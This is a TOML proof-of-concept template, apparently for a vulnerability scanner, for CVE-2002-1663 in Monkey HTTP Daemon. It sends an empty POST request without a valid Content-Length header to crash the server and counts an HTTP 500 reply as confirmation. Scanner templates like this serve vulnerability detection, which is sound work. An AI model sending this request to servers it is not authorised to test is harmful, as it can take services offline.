[info]
author = "ave"
description = "向 Monkey HTTP Daemon 发送包含无效或缺失 Content-Length 头部的 POST 请求，触发服务崩溃验证拒绝服务漏洞"
id = "POC-AVE-2002-0651"
name = "Monkey HTTP Daemon Invalid POST Request DoS PoC"
severity = "medium"
tags = ["ave-2002-0651"]
vuln_id = [
    "CVE-2002-1663",
    "AVE-2002-0651",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
status = [500]
type = "status"
